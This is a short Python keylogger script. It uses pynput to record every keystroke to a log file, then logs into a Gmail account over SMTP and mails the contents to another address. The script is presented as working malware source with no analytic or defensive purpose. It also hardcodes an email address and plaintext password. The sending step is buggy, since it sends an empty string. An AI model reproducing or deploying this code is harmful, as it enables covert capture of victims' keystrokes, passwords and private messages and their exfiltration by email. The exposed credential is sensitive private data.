#INFO
email = "konkolpythonapps@gmail.com"
password = "Techno777"
to = "youremail@gmail.com"
#INFO


#LOGGING
from pynput.keyboard import Key, Listener
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

while -1 < 0:
  def on_press(key):
      logging.info(str(key))

  with Listener(on_press=on_press) as listener:
      listener.join()
  #LOGGING


  #SENDING
  logs = ""
  import smtplib
  s = smtplib.SMTP("smtp.gmail.com", 587)
  s.starttls()
  s.login(email, password)
  s.sendmail(email, to , logs);
  s.quit()
#SENDING
